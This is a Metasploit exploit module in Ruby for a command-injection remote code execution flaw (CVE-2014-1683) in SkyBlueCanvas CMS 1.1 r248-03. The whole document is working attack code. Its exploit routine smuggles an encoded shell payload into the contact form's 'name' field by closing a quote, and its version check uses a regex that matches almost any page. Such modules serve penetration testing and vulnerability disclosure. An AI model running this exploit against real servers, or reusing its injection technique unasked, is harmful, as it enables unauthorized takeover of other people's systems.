# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SkyBlueCanvas CMS Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary command execution vulnerability
        in SkyBlueCanvas CMS version 1.1 r248-03 and below.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Scott Parish&#039;, # Vulnerability discovery and exploit
          &#039;xistence <xistence[at]0x90.nl>&#039; # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-1683&#039;],
          [&#039;OSVDB&#039;, &#039;102586&#039;],
          [&#039;BID&#039;, &#039;65129&#039;],
          [&#039;EDB&#039;, &#039;31183&#039;],
          [&#039;URL&#039;, &#039;http://packetstormsecurity.com/files/124948/SkyBlueCanvas-CMS-1.1-r248-03-Command-Injection.html&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039; =>
            {
              &#039;ConnectionType&#039; => &#039;find&#039;,
              &#039;PayloadType&#039;    => &#039;cmd&#039;,
              &#039;RequiredCmd&#039;    => &#039;generic perl ruby bash telnet python&#039;
            }
        },
      &#039;Platform&#039;       => %w{ unix },
      &#039;Targets&#039;        =>
        [
          [&#039;SkyBlueCanvas 1.1 r248&#039;, {}]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;DisclosureDate&#039; => &#039;Jan 28 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,[true, "The path to the SkyBlueCanvas CMS installation", "/"]),
      ],self.class)
  end

  def check
    uri = normalize_uri(target_uri.path.to_s, "index.php")

    res = send_request_raw(&#039;uri&#039; => uri)

    if res and res.body =~ /[1.1 r248]/
      vprint_good("#{peer} - SkyBlueCanvas CMS 1.1 r248-xx found")
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    uri = normalize_uri(target_uri.path.to_s, "index.php")

    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => uri,
      &#039;vars_get&#039; => { &#039;pid&#039; => &#039;4&#039; },
      &#039;vars_post&#039; =>
        {
          &#039;cid&#039; => &#039;3&#039;,
          &#039;name&#039; => "#{rand_text_alphanumeric(10)}\";#{payload.encoded};",
          &#039;email&#039; => rand_text_alphanumeric(10),
          &#039;subject&#039; => rand_text_alphanumeric(10),
          &#039;message&#039; => rand_text_alphanumeric(10),
          &#039;action&#039; => &#039;Send&#039;
        }
    })
  end
end

